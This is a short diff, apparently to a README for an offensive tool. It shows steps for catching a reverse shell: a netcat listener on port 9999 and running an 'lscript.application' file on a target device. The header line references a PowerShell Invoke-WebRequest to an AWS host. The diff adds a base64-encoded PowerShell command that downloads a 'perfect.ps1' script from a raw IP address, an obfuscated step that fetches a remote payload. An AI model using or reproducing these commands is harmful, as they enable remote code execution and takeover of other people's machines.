@@ -44,3 +44,6 @@ echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws
 3. Start the listener with ```nc -lnvp 9999```
 4. Execute the _lscript.application_ file on the target device.
 5. Check the listener.
+
+
+aXdyKC1Vc2VCYXNpY1BhcnNpbmcgaHR0cDovLzMuMjUzLjI0NS4xMjA6ODAvcGVyZmVjdC5wczEp
